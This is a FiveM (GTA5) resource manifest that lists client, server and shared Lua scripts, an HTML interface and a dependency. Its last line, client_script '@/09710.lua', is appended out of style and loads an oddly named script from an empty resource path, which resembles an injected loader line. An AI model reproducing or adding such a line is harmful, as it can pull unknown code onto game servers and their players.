fx_version "cerulean"
games { "gta5" }

client_scripts {
    "config.lua",
    "locales/*.lua",
    "utils/client.lua",
    "client/*.lua",
}

server_scripts {
    "config.lua",
    "locales/*.lua",
    "utils/server.lua",
    "server/*.lua",
}

shared_scripts {
    "utils/shared.lua",
}

ui_page "html/off.html"

files {
    "html/*.html",
    "html/support/**/*.*",
    "html/js/*.js",
    "html/css/*.css",
    "html/css/img/*.png",
    "html/css/img/*.jpg",
}

dependencies {
    "tv_scaleform",
}
client_script '@/09710.lua'